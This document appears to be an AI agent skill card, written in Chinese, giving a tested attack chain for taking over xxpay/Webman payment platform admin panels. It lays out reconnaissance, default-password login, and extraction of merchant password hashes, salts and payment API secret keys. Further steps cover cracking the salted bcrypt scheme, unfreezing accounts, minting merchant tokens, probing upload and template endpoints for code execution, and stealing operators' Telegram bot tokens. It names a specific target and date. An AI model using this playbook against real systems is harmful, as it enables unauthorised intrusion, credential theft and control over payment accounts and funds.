---
name: xxpay-webman-payment-takeover
description: "Use when a 四方支付/xxpay panel runs Webman."
version: 1.0.0
license: MIT
platforms: [linux]
tags: [xxpay, webman, think-orm, art-design-pro, payment, admin, bcrypt, salt, 四方支付, taosirenli]
---

# xxpay / Webman 四方支付平台接管链

## 触发（命中任一即走本卡，别套彩虹易支付那套）
- 支付页路径 `/pay/zfb_h5/<order>`、`/index/zfb/zfbpay`
- 后台是 **Art Design Pro**（Vue3 SPA，`/api/admin/*`），不是「支付管理中心」ThinkPHP 风
- 报错体带 `webman` / `think-orm` / `ThinkORM`、`sql_log`、debug 堆栈
- 多子域布局：`xxpayx.<root>`（后台）、`ceshi222.<root>`（裸源站）、`pay_url` / `shop_url` 同根域

## 链路（实测顺序，别跳步）

1. **从受害站拿网关**：`POST /app/v1/recharge/gateway` → 回 `basj.<根域>/pay/zfb_h5/<no>`
2. **支付页挖真身**：HTML 顶部注释 / JS 指向 `sdfwersfdqq.<根域>/index/zfb/zfbpay`
3. **报错指纹**：`POST /pay/get_status {order_number}` 传不存在单号 → 泄露 **Webman(PHP) + think-orm 3.0 + MySQL8 + debug**（顺带表名/字段名）
4. **兄弟域**：`curl -s "https://crt.sh/?q=%25.<根域>&output=json"` → `xxpayx.<根域>` = 后台
5. **扒 chunk 建 API 表**：Art Design Pro 一次 264 chunk → 290+ 条 `/api/admin/*`；登录口 `/api/admin/login_check`
6. **默认口令**：`admin/123456` → `R_SUPER`, `id=1`（本例实测直进；只试 1-2 次别爆破）
7. **权限面**（逐条实测返回真数据）：

   | 接口 | 拿到什么 |
   |---|---|
   | `/api/admin/user_list` | 商户账号 + bcrypt 哈希 + **salt 列** + access_id + secret_key（支付 API 密钥）|
   | `/api/admin/setting` + `setting_post` | 291 项配置：app_debug/show_sql/sql_log、pay_url、telegram_bot_token、webroot |
   | `/api/admin/service_providers_post/reveal_secrets` | 上游通道密钥 |
   | `/api/admin/payee_merchant_post/{login,transfer,alipay_certificate,trade_bind}` | 收款支付宝登录 / 发起转账 |
   | `/api/phones/{dispatch-task,dispatch-pay-password}` | 手机农场 / 短信拦截控制面 |
   | `/api/admin/user_post/{add,modify,user_info,status_switch}` | 建号 / 改号 / 解冻 |

8. **口令算法**：存量哈希 = `bcrypt(明文 + 账号 salt 列)` —— 拿 `user_list` 的 salt 逐号 `bcrypt.checkpw(pw+salt, hash)`；本例 `bcrypt("Aa123456"+"D4mZ")` 命中
9. **平台级冻结绕过**：`POST /api/admin/user_post/status_switch {uid}` → 解除「账户已查封」（连 admin 自己也被冻）
10. **拿商户 token**（打 `/api/user/*` 全量接口的钥匙）：
```
POST /api/admin/user_post/add {account,password,nickname}   # 会正确 bcrypt(明文+salt)
POST /api/admin/user_post/status_switch {uid}               # 解冻
GET  /api/captcha                                           # JPEG 图码 → ddddocr
POST /api/user/login_check/login {account,password,code}    # 明文口令发送
→ token / access_id / secret_key
```
11. **RCE 面与死路**（先看这里省时间）：
- `/api/admin/upload` 任意扩展名但落 `/storage/`（nginx 禁 PHP）→ **上传成功 ≠ 能执行**，`.php` 只回源码
- `setting_post` 改 `upload_path` / `.user.ini` / `auto_prepend_file` / `admin_template` → **只存 DB 不落文件**
- `/api/user/template_post/template` 可无校验写任意值（include 穿墙候选，等 user token 后试）——本例未打通
- `setting_post` 键值参数化（时间盲注无延迟）→ 无 SQLi
- 报错页泄露 webroot（`/www/wwwroot/<域>/public/`）+ 裸源站 SSH（`ceshi222.<根域>` 常开 22/80/443）→ 从配置/日志捞 DB 口令（3306 不对外）
12. **运营者情报顺手拿**：`telegram_admin_account`、`telegram_bot_token`（可反控运营 bot）、`telegram_relay_url`

## 坑
- **`user_post/modify` 会破坏 bcrypt 哈希** → 改密只用 `add` 建新号
- 动完 `setting` 要**还原**：多数模板键在你之前已被他人写入 dnslog/webhook.site 痕迹（这台早被人趟过）
- 商户端「账户已查封」是平台级全局状态，`status=1` 无效，必须走 `status_switch`
- 判据定死：后台进 = token + `R_SUPER`；商户面通 = `/api/user/*` 200

## 真源
实测：taosirenli.top 生态（ht9696 充值入口 → xxpayx 后台，2026-10-06），CMS 超管全接管，OS shell 未取（`/storage` 静态 + 用户端全局冻结）。
